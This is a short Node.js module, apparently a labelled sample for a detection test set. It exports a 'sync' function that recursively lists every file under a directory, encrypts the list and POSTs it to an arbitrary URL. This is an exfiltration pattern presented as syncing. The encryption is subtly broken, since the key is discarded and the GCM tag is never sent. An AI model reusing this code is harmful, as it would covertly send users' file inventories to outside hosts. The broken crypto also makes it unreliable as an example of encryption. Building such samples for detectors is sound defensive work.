'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D0 标准 API：全部直调，不含任何包装
async function sync(root, url) {
  const files = treescan(root);
  const key = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const body = Buffer.concat([iv, cipher.update(Buffer.from(files.join('\n'))), cipher.final()]);
  return fetch(url, { method: 'POST', body: body });
}
module.exports = { sync };
